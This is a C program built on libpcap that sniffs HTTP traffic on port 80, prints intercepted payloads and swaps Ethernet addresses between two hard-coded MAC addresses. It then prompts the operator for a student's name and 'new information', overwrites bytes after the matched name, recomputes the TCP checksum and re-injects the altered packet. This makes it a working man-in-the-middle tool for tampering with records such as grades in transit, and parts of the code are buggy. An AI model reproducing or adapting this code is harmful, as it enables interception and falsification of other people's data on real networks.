#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <string.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

// Calculate TCP checksum
u_int16_t tcp_checksum(struct iphdr *pIph, u_char *ipPayload) {
    u_int32_t sum = 0;
    u_int16_t tcpLen = ntohs(pIph->tot_len) - (pIph->ihl << 2);
    struct tcphdr *tcphdrp = (struct tcphdr*)(ipPayload);
    
    // Add the pseudo header
    sum += (pIph->saddr >> 16) & 0xFFFF;
    sum += (pIph->saddr) & 0xFFFF;
    sum += (pIph->daddr >> 16) & 0xFFFF;
    sum += (pIph->daddr) & 0xFFFF;
    sum += htons(IPPROTO_TCP);
    sum += htons(tcpLen);
 
    // Add the IP payload
    tcphdrp->check = 0;
    while (tcpLen > 1) {
        sum += *((uint16_t *)ipPayload);
        ipPayload += 2;
        tcpLen -= 2;
    }
    
    // If any bytes left, pad and add
    if (tcpLen > 0) {
        sum += ((*ipPayload) & htons(0xFF00));
    }
    
    // Fold 32-bit sum to 16 bits
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    sum = ~sum;
    
    return (u_int16_t)sum;
}

// Convert 32-bit network address and mask to dot format
void get_device_info(bpf_u_int32 net_32bits, bpf_u_int32 mask_32bits, char ip_address[], char net_mask[]) {
    struct in_addr address;
    address.s_addr = net_32bits;
    strcpy(ip_address, inet_ntoa(address));
    address.s_addr = mask_32bits;
    strcpy(net_mask, inet_ntoa(address));
}

int main() {
    char *device;
    char error_buffer[PCAP_ERRBUF_SIZE];
    bpf_u_int32 net_32bits, mask_32bits;
    char ip_address[15], net_mask[15];
    int status_net_info;
    pcap_if_t *alldev;
    pcap_t *session;
    const u_char *packet, *ptr, *payload, *tcp_header;
    u_char *ptr2, *ip_payload, *ptr3;
    struct pcap_pkthdr header;
    struct ether_header *eth_header;
    struct iphdr *ip_header;
    struct tcphdr *tcp_hdr;
    struct in_addr address;
    char filter[] = "tcp port 80";
    struct bpf_program filter_program;
    int i, flag = 1, tcp_header_length;
    
    // Find available network devices
    if (pcap_findalldevs(&alldev, error_buffer) != 0) {
        printf("Error while finding a device: %s\n", error_buffer);
        return 0;
    } else {
        device = alldev->name;
        printf("Selected device: %s\n", device);
    }
    
    // Get network information
    status_net_info = pcap_lookupnet(device, &net_32bits, &mask_32bits, error_buffer);
    if (status_net_info == -1) {
        printf("Unable to get information about device: %s\n", error_buffer);
        return 0;
    }
    get_device_info(net_32bits, mask_32bits, ip_address, net_mask);
    printf("Network address: %s\n", ip_address);
    printf("Network mask: %s\n", net_mask);
    
    // Open packet sniffing session
    session = pcap_open_live(device, BUFSIZ, 1, 1000, error_buffer);
    if (session == NULL) {
        printf("Unable to open a packet sniffing session: %s\n", error_buffer);
        return 0;
    }
    
    // Compile and set packet filter
    if (pcap_compile(session, &filter_program, filter, 0, net_32bits) == -1) {
        printf("Filter string could not be compiled\n");
        return 0;
    }
    if (pcap_setfilter(session, &filter_program) == -1) {
        printf("Could not set filter\n");
        return 0;
    }
    
    // Main packet capture loop
    do {
        packet = pcap_next(session, &header);
        if (packet == NULL) {
            printf("No packet found\n");
            return 0;
        }
        
        printf("Original packet length: %d\n", header.len);
        printf("Captured packet length: %d\n", header.caplen);
        
        // Process Ethernet header
        eth_header = (struct ether_header*)packet;
        char source_address[18];
        strcpy(source_address, ether_ntoa((const struct ether_addr *)&eth_header->ether_shost));
        printf("Source address: %s\n", source_address);
        printf("Destination: %s\n", ether_ntoa((const struct ether_addr *)&eth_header->ether_dhost));
        printf("Packet type: %u\n", ntohs(eth_header->ether_type));
        
        // Process IP packet
        if (ntohs(eth_header->ether_type) == ETHERTYPE_IP) {
            printf("IP packet detected\n");
            
            // Print packet content in hexadecimal
            ptr = packet;
            ptr2 = (u_char *)packet;
            ptr3 = (u_char *)packet;
            for (int i = 0; i < header.caplen; i++) {
                printf("%02x", *ptr);
                ptr++;
                if ((i + 1) % 6 == 0) printf("\t");
            }
            printf("\n");
            
            // Process IP header
            ip_header = (struct iphdr *)(packet + sizeof(struct ether_header));
            address.s_addr = ip_header->daddr;
            printf("Destination IP address: %s\n", inet_ntoa(address));
            
            // Process TCP header
            tcp_header = (packet + sizeof(struct ether_header) + sizeof(struct iphdr));
            tcp_header_length = ((*(tcp_header + 12)) & 0xF0) >> 4;
            tcp_header_length *= 4;
            printf("TCP header length: %d bytes\n", tcp_header_length);
            
            ip_payload = (u_char *)(packet + sizeof(struct ether_header) + sizeof(struct iphdr));
            tcp_hdr = (struct tcphdr*)(ip_payload);
            payload = (packet + sizeof(struct ether_header) + sizeof(struct iphdr) + tcp_header_length);
            int payload_length = header.caplen - (sizeof(struct ether_header) + sizeof(struct iphdr) + tcp_header_length);
            int total_packet_size = header.caplen;
            
            printf("Payload size: %d bytes\n", payload_length);
            printf("Total Packet Size: %d bytes\n", total_packet_size);
            
            // MAC address spoofing
            struct ether_addr *mac_address;
            if (strcmp(source_address, "14:18:77:26:6b:89") == 0) {
                mac_address = ether_aton("44:a8:42:48:21:3b");
            } else if (strcmp(source_address, "44:a8:42:48:21:3b") == 0) {
                mac_address = ether_aton("14:18:77:26:6b:89");
            }
            if (mac_address == NULL) {
                printf("Unable to convert address\n");
                return 1;
            }
            
            // Modify MAC address in packet
            for (int i = 0; i < 6; i++) {
                *ptr2 = (u_char)(mac_address->ether_addr_octet[i]);
                ptr2++;
            }
            
            // Process and modify payload
            if (payload_length > 0) {
                printf("Original TCP checksum: %04x\n", tcp_hdr->check);
                printf("Computed TCP checksum: %04x\n", htons(tcp_checksum(ip_header, ip_payload)));
                
                printf("File content intercepted: ");
                const u_char *temp_pointer = payload;
                int byte_count = 0;
                while (byte_count++ < payload_length) {
                    printf("%c", *temp_pointer);
                    temp_pointer++;
                }
                printf("\n");
                
                // User input for student information modification
                printf("Which student's information do you want to change? ");
                char student_name[20];
                scanf("%s", student_name);
                printf("What is the new information? ");
                char new_info[2];
                scanf("%s", new_info);
                
                // Modify payload
                u_char *temp_pointer2 = (u_char *)payload;
                int byte_count2 = 0;
                int i = 0;
                while (byte_count2++ < payload_length) {
                    if (*temp_pointer2 == student_name[i]) {
                        i++;
                    } else {
                        i = 0;
                    }
                    if (i == (strlen(student_name) - 1)) {
                        printf("Successful Match Found\n");
                        temp_pointer2 += 3;
                        *temp_pointer2 = new_info[0];
                        (*(++temp_pointer2)) = new_info[1];
                        break;
                    }
                    temp_pointer2++;
                }
                
                // Recalculate TCP checksum
                tcp_hdr->check = tcp_checksum(ip_header, ip_payload);
                
                // Print modified payload
                printf("Modified payload: ");
                for (int i = 0; i < header.caplen; i++) {
                    printf("%02x", *ptr3);
                    ptr3++;
                    if ((i + 1) % 6 == 0) printf("\t");
                }
                printf("\n");
                
                temp_pointer = payload;
                byte_count = 0;
                while (byte_count++ < payload_length) {
                    printf("%c", *temp_pointer);
                    temp_pointer++;
                }
                printf("\n");
            }
            
            // Send modified packet
            int total_bytes_sent = pcap_inject(session, packet, total_packet_size);
            printf("Total bytes sent: %d\n", total_bytes_sent);
        } else {
            printf("Unknown packet type\n");
        }
    } while (flag);
    
    pcap_close(session);
    return 0;
}
